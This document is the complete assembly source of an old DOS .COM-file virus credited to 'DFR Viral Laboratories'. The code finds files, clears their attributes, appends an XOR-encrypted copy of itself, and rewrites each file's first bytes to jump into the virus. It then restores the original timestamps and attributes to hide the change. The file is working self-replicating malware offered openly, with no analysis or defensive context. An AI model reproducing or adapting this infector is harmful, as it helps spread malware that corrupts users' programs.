; Rage Against The Machine #2 - Saruman / DFR Viral Laboratories
;
; Specifics: NON-RES .COM INFECTOR, ENCRYPTION, TIME/DATE PRESERVATION
;
; To Do:
;  Check already infected
;  Check filesize
;  Scan dirs ...

.model tiny
.code
.radix 16

include fileattr.inc

VirusSize   equ  END_OF_VIRUS - MAIN
EntryOfs    equ  STARTCODE - MAIN - 3

            org 100

main:       jmp startcode
dummy       db 0                             ;jmp short<>jmp near (2 vs 3 bytes)

; set marker here? Or read virus body?

orgheader   db 0cdh,020h,0                   ;terminate for 1:st generation
cryptkey    dw 0

write_virus:
            add word ptr bp+cryptkey,0ffffh
            call endecrypt                   ;encrypt code

            mov ah,40
            mov bx,BP+FILE
            mov cx,VIRUSSIZE
            lea dx,bp+main
            int 21                           ;Write virus body

            call endecrypt                   ;decrypt code again
            ret

endecrypt:
            mov di,bp
            add di,offset encryption_start
            mov cx,(end_of_virus-encryption_start+1)/2
            mov bx,bp+cryptkey
           lop:
            xor word ptr[di],bx
            add di,2
           loop lop
            jmp endecrypt-1

            ret

startcode:
            call nextline
nextline:
            pop bp
            sub bp,offset nextline

            call endecrypt

encryption_start:

            include no_msav.inc

            mov di,100                        ;Recreate header
            lea si,bp+orgheader
            cld
            movsw
            movsb

; now.. let's see....

            mov ah,1a
            lea dx,bp+dta
            int 21                            ;Setup DTA area

            mov ah,4e
            mov cx,anyfile-directory          ;-readonly-hidden-system
            lea dx,bp+wildcard
            int 21                            ;Find First

            jc exit

findnext:
            call process_victim               ;do for every file found.
            mov ah,4f
            int 21                            ;Find Next
            jnc findnext

exit:
            mov     ah,1ah                    ;ReSet DTA address ...
            mov     dx,80h                    ;... to default DTA
            int     21h
            xor     ax,ax                     ;Reset all regs
            mov     bx,ax
            mov     cx,ax
            mov     dx,ax
            mov     si,ax
            mov     di,ax
            mov     sp,0FFFEh                 ;SP= 0
            mov     bp,100h                   ;BP= 100h (RETurn addr)
            push    bp                        
            mov     bp,0                      
            ret                               ;return to 100h

process_victim:

            mov ax,4301
            lea dx,bp+filename
            mov cx,0
            int 21                           ;clear file-attributes
                                             ;BEFORE OPEN! = IMPORTANT!

            mov ax,3d02
            lea dx,bp+filename
            int 21                           ;Open file r/w

            mov BP+FILE,ax                   ;Save the file handle
            xchg ax,bx
            mov ah,3f
            mov cx,3
            lea dx,bp+ORGHEADER
            int 21                           ;Read first 3 bytes & store them

            mov ax,word ptr [bp+file_size]   ;Calculate jmp-header
            add ax,ENTRYOFS
            mov byte ptr [BP+BUF],0E9h       ; E9 = opcode for JMP
            mov word ptr [BP+BUF+1],ax       ; ax = filesize+offset into virus


            mov ax,4200
;            mov bx,BP+FILE
            xor cx,cx
            xor dx,dx
            int 21                           ;Seek to beginning of file
         
            mov ah,40
;            mov bx,BP+FILE
            mov cx,3
            lea dx,BP+BUF
            int 21                           ;Write JMP to header

            mov ax,4202
;            mov bx,BP+FILE
            xor cx,cx
            xor dx,dx
            int 21                           ;Seek to end of file

            call write_virus

            mov ax,5701
            mov bx,BP+FILE
            mov cx,word ptr [bp+file_time]
            mov dx,word ptr [bp+file_date]
            int 21                           ;Restore old datestamp

            mov ah,3e
;            mov bx,BP+FILE
            int 21                           ;Close file

            lea dx,bp+filename
            mov ax,4301
            xor ch,ch
            mov cl,byte ptr [bp+attribute]
            int 21                           ;Restore old attributes

            ret

wildcard:   db '*.!!!',0
message     db 'Rage Against The Machine'

END_OF_VIRUS:

include     dta.inc
buf         db ?,?,?
file        dw ?

end	main
